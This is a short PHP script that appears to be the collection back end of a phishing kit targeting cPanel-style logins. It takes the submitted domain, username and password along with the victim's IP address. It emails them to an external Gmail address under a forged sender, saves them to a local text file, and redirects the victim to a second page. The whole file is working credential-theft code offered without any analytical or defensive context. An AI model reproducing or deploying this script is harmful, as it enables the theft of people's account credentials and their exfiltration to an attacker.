<?php

$adddate=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$message .= "Dom *: ".$_POST['dom']."\n";
$message .= "Us *: ".$_POST['us']."\n";
$message .= "Pa*: ".$_POST['pa']."\n";
$message .= "IP: ".$ip."\n";



$recipient = "cyberg289@gmail.com";
$sender = 'cp111543456346@yet345634.com';
$headers .= "From: CP 1<$sender>\n";
$subject = "CP 1";
mail($recipient,$subject,$message,$headers);
    $text = fopen('1111.txt', 'a');
fwrite($text, $message);
mail(','.$form,$subject,$message,$headers);

	   
		   header("Location: index2.html");?>